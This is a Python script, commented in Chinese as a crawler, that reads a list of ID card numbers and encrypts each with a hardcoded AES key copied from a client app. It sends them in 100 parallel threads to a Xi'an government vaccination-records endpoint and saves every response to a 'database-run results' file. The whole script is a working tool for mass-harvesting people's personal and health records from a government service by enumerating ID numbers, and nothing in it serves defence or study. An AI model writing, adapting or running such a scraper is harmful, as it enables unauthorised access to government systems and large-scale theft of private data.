# 爬虫 陕西地址 常用 全户
import threading

import requests
from Crypto.Cipher import AES
from cryptography.hazmat.primitives import padding

aes_cipher = AES.new(key=b'neusof+-*/@123!!', mode=AES.MODE_ECB)


def pkcs7_padding(data, block_size=128):
    padder = padding.PKCS7(block_size).padder()
    return padder.update(data) + padder.finalize()


def aes_ECB_Encrypt(data):
    data = pkcs7_padding(data.encode(encoding='utf-8'))
    return aes_cipher.encrypt(data).hex()


with open('这里输入文件名字', 'r') as file:
    idcards = file.readlines()

encrypted_results = []
for idcard in idcards:
    idcard = idcard.strip()
    encidcard = aes_ECB_Encrypt(idcard)
    encrypted_results.append(encidcard)


def request_function(encidcard):
    headers = {
    }
    data = '{"idCard":"' + encidcard + '"}'
    res = requests.post('https://yqpt.xa.gov.cn/neusoft-appt/appt-vfic/app/jwx/archives/v1v2/downloadVacc3ByIdCard',
                        headers=headers,
                        data=data).json()
    with open('陕西跑库结果.txt', 'a') as outfile:
        outfile.write(str(res) + '\n')


threads = []
for encidcard in encrypted_results:
    thread = threading.Thread(target=request_function, args=(encidcard,))
    threads.append(thread)
    thread.start()
    if len(threads) >= 100:  # 线程
        for thread in threads:
            thread.join()
        threads = []

for thread in threads:
    thread.join()

print("爬取完成。")
